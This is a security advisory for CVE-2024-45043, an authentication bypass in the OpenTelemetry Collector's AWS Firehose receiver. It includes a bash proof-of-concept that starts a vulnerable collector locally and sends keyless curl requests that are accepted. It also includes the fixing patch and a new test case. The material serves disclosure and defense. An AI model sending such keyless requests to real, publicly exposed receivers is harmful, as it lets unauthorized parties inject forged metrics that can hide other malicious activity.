# [M] OpenTelemetry Collector module AWS Firehose Receiver Authentication Bypass Vulnerability

## Summary
Severity: Medium
Advisory: GHSA-prf6-xjxh-p698
CVE: CVE-2024-45043
CWE: CWE-200, CWE-285
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2024-08-29
Source: https://github.com/advisories/GHSA-prf6-xjxh-p698
Type: github-advisory

## Affected
- Go: `github.com/open-telemetry/opentelemetry-collector-contrib/receiver/awsfirehosereceiver` — affected >=0.49.0 <0.108.0

## Details
### Summary

OpenTelemetry Collector module [`awsfirehosereceiver`](https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/receiver/awsfirehosereceiver) allows unauthenticated remote requests, even when configured to require a key.

OpenTelemetry Collector can be configured to receive CloudWatch metrics via an AWS Firehose Stream. [Firehose sets the header](https://docs.aws.amazon.com/firehose/latest/dev/httpdeliveryrequestresponse.html) `X-Amz-Firehose-Access-Key` with an arbitrary configured string. The OpenTelemetry Collector awsfirehosereceiver can optionally be configured to require this key on incoming requests. However, when this is configured it **still accepts incoming requests with no key**.

### Impact

Only OpenTelemetry Collector users configured with the “[alpha](https://github.com/open-telemetry/opentelemetry-collector#alpha)” `awsfirehosereceiver` module are affected. This module was [added](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/74) in version v0.49.0 of the [“Contrib” distribution](https://github.com/open-telemetry/opentelemetry-collector-releases/tree/main/distributions/otelcol-contrib) (or may be included in custom builds).

There is a risk of unauthorized users writing metrics. Carefully crafted metrics could hide other malicious activity. There is no risk of exfiltrating data. It’s likely these endpoints will be exposed to the public internet, as Firehose [does not support private HTTP endpoints](https://docs.aws.amazon.com/firehose/latest/dev/controlling-access.html#using-iam-http).

### Fix

A fix was introduced in https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847 and released with v0.108.0 (https://github.com/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.108.0).

### Details

<details>
  <summary>Details</summary>

#### PoC

When simulating Firehose requests against vulnerable versions of the Collector, we can see “UNAUTHORIZED METRICS” printed to the console via the debug exporter.
(Note this script doesn’t run on some older still-vulnerable versions that do not have the “debug” exporter.)

```shell
#!/bin/bash

OTELCOL_VERSION=0.107.0
OTELCOL_BINARY="otelcol-contrib-${OTELCOL_VERSION}"
OTELCOL_PLATFORM="linux_amd64"
HOST_PORT=8081

cat > config.yaml << END
# https://opentelemetry.io/docs/collector/configuration/
exporters:
  debug:
    verbosity: normal
receivers:
  awsfirehose:
    endpoint : "127.0.0.1:${HOST_PORT}"
    record_type : "cwmetrics"
    access_key : "1234"
service:
  pipelines:
    metrics:
      receivers:
      - awsfirehose
      exporters:
      - debug
  telemetry:
    logs:
      encoding: "json"
      level: "debug"
END


if [ ! -x "${OTELCOL_BINARY}" ]; then
    curl --proto '=https' --tlsv1.2 -fOL https://github.com/open-telemetry/opentelemetry-collector-releases/releases/download/v${OTELCOL_VERSION}/otelcol-contrib_${OTELCOL_VERSION}_${OTELCOL_PLATFORM}.tar.gz
    tar -xvf otelcol-contrib_${OTELCOL_VERSION}_${OTELCOL_PLATFORM}.tar.gz otelcol-contrib
    mv otelcol-contrib ${OTELCOL_BINARY}
fi

"./${OTELCOL_BINARY}" --config=config.yaml &
OTELCOL_PID=$!

echo "Running OTel Collector with PID ${OTELCOL_PID}"

sleep 3

# Send metrics with correct access key
if ! curl --fail \
  -H "Content-Type: application/json"\
  -H "X-Amz-Firehose-Request-Id: requestId-valid"\
  -H "X-Amz-Firehose-Access-Key: 1234"\
  --data '{"requestId":"requestId-valid","timestamp":1723704887152,"records":[{"data":"eyJtZXRyaWNfc3RyZWFtX25hbWUiOiJ0ZXN0IiwiYWNjb3VudF9pZCI6IjEyMzQ1Njc4OSIsInJlZ2lvbiI6InVzLWVhc3QtMSIsIm5hbWVzcGFjZSI6IkFXUy9DbG91ZEZyb250IiwibWV0cmljX25hbWUiOiJSZXF1ZXN0cyIsImRpbWVuc2lvbnMiOnsiRGlzdHJpYnV0aW9uSWQiOiJBQkNEIiwiUmVnaW9uIjoiR2xvYmFsIn0sInRpbWVzdGFtcCI6MTcyMzcwNDU0MDAwMCwidmFsdWUiOnsibWF4IjoxLjAsIm1pbiI6MS4wLCJzdW0iOjkuMCwiY291bnQiOjkuMH0sInVuaXQiOiJOb25lIn0="}]}'\
  http://127.0.0.1:${HOST_PORT}
then
    echo "Unexpected – Request with valid access key did not succeed"
    kill ${OTELCOL_PID}
    exit 1
fi

# Send metrics with incorrect access key
if curl --fail \
  -H "Content-Type: application/json"\
  -H "X-Amz-Firehose-Request-Id: requestId-invalid"\
  -H "X-Amz-Firehose-Access-Key: 5678"\
  --data '{"requestId":"requestId-invalid","timestamp":1723704887152,"records":[{"data":"eyJtZXRyaWNfc3RyZWFtX25hbWUiOiJ0ZXN0IiwiYWNjb3VudF9pZCI6IjEyMzQ1Njc4OSIsInJlZ2lvbiI6InVzLWVhc3QtMSIsIm5hbWVzcGFjZSI6IkFXUy9DbG91ZEZyb250IiwibWV0cmljX25hbWUiOiJVTkFVVEhPUklaRUQgTUVUUklDUyIsImRpbWVuc2lvbnMiOnsiRGlzdHJpYnV0aW9uSWQiOiJBQkNEIiwiUmVnaW9uIjoiR2xvYmFsIn0sInRpbWVzdGFtcCI6MTcyMzcwNDU0MDAwMCwidmFsdWUiOnsibWF4IjoxLjAsIm1pbiI6MS4wLCJzdW0iOjU2NzguMCwiY291bnQiOjU2NzguMH0sInVuaXQiOiJOb25lIn0="}]}'\
  http://127.0.0.1:${HOST_PORT}
then
    echo "Unexpected – Request succeeded with invalid access key"
    kill ${OTELCOL_PID}
    exit 1
fi

# Send unauthorized metrics without an access key
if curl --fail \
  -H "Content-Type: application/json"\
  -H "X-Amz-Firehose-Request-Id: requestId-unauthorized"\
  --data '{"requestId":"requestId-unauthorized","timestamp":1723704887152,"records":[{"data":"eyJtZXRyaWNfc3RyZWFtX25hbWUiOiJ0ZXN0IiwiYWNjb3VudF9pZCI6IjEyMzQ1Njc4OSIsInJlZ2lvbiI6InVzLWVhc3QtMSIsIm5hbWVzcGFjZSI6IkFXUy9DbG91ZEZyb250IiwibWV0cmljX25hbWUiOiJVTkFVVEhPUklaRUQgTUVUUklDUyIsImRpbWVuc2lvbnMiOnsiRGlzdHJpYnV0aW9uSWQiOiJBQkNEIiwiUmVnaW9uIjoiR2xvYmFsIn0sInRpbWVzdGFtcCI6MTcyMzcwNDU0MDAwMCwidmFsdWUiOnsibWF4IjoxLjAsIm1pbiI6MS4wLCJzdW0iOjU2NzguMCwiY291bnQiOjU2NzguMH0sInVuaXQiOiJOb25lIn0="}]}'\
  http://127.0.0.1:${HOST_PORT}
then
    echo -e "\n*** Vulnerability present - request with no access key succeeded ***\n"
else
    echo "Not vulnerable - request with no key was denied."
    kill ${OTELCOL_PID}
    exit 1
fi

kill ${OTELCOL_PID}
```

#### Patch

The [`if` statement](https://github.com/open-telemetry/opentelemetry-collector-contrib/blob/v0.107.0/receiver/awsfirehosereceiver/receiver.go#L235) makes the access key header optional, rather than the configuration optional.

This has been patched in #34847 to separately handle the case where access_key is not configured, and use a default-deny style:

```diff
diff --git a/receiver/awsfirehosereceiver/receiver.go b/receiver/awsfirehosereceiver/receiver.go
index 6211f61221..4d78eb2778 100644
--- a/receiver/awsfirehosereceiver/receiver.go
+++ b/receiver/awsfirehosereceiver/receiver.go
@@ -233,10 +233,14 @@ func (fmr *firehoseReceiver) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 // validate checks the Firehose access key in the header against
 // the one passed into the Config
 func (fmr *firehoseReceiver) validate(r *http.Request) (int, error) {
-       if accessKey := r.Header.Get(headerFirehoseAccessKey); accessKey != "" && accessKey != string(fmr.config.AccessKey) {
-               return http.StatusUnauthorized, errInvalidAccessKey
+       if string(fmr.config.AccessKey) == "" {
+               // No access key is configured - accept all requests.
+               return http.StatusAccepted, nil
+       }
+       if accessKey := r.Header.Get(headerFirehoseAccessKey); accessKey == string(fmr.config.AccessKey) {
+               return http.StatusAccepted, nil
        }
-       return http.StatusAccepted, nil
+       return http.StatusUnauthorized, errInvalidAccessKey
 }

diff --git a/receiver/awsfirehosereceiver/receiver_test.go b/receiver/awsfirehosereceiver/receiver_test.go
index b02a391dd5..1ef5bdf4d3 100644
--- a/receiver/awsfirehosereceiver/receiver_test.go
+++ b/receiver/awsfirehosereceiver/receiver_test.go
@@ -123,6 +123,14 @@ func TestFirehoseRequest(t *testing.T) {
                        wantStatusCode: http.StatusUnauthorized,
                        wantErr:        errInvalidAccessKey,
                },
+               "WithNoAccessKey": {
+                       headers: map[string]string{
+                               headerFirehoseAccessKey: "",
+                       },
+                       body:           testFirehoseRequest(testFirehoseRequestID, noRecords),
+                       wantStatusCode: http.StatusUnauthorized,
+                       wantErr:        errInvalidAccessKey,
+               },
                "WithoutRequestId/Body": {
                        headers: map[string]string{
                                headerFirehoseRequestID: testFirehoseRequestID,

```

</details>

## References
- https://github.com/google/security-research/security/advisories/GHSA-q9wq-xc9h-xrw9
- https://github.com/open-telemetry/opentelemetry-collector-contrib/security/advisories/GHSA-prf6-xjxh-p698
- https://nvd.nist.gov/vuln/detail/CVE-2024-45043
- https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847
- https://github.com/open-telemetry/opentelemetry-collector-releases/pull/74
- https://github.com/open-telemetry/opentelemetry-collector-contrib/commit/371bf6afbd7cfa3253fa1674f5444064e86ef0ac
- https://docs.aws.amazon.com/firehose/latest/dev/controlling-access.html#using-iam-http
- https://docs.aws.amazon.com/firehose/latest/dev/httpdeliveryrequestresponse.html
- https://github.com/open-telemetry/opentelemetry-collector#alpha
- https://github.com/open-telemetry/opentelemetry-collector-contrib
- https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/receiver/awsfirehosereceiver
- https://github.com/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.108.0
- https://github.com/open-telemetry/opentelemetry-collector-releases/tree/main/distributions/otelcol-contrib
